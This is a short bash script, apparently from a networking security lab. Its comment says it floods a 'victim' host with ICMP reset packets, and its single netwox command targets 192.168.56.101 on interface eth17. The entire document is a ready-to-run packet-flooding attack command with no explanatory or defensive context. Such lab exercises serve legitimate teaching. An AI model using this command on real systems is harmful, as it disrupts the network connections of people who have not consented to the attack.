#!/bin/bash

# flood victim with icmp reset packets
netwox 82 -i 192.168.56.101 -c 2 -d eth17
